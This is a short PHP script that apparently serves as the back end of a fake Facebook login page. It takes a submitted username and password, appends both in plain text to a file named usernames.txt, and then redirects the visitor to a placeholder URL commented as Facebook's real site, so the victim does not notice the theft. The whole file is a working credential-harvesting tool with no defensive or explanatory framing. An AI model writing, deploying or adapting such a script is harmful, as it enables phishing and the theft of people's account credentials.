<?php

file_put_contents("usernames.txt", "Facebook Username: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://facebook.com/
header("Location: $url");
exit();
?>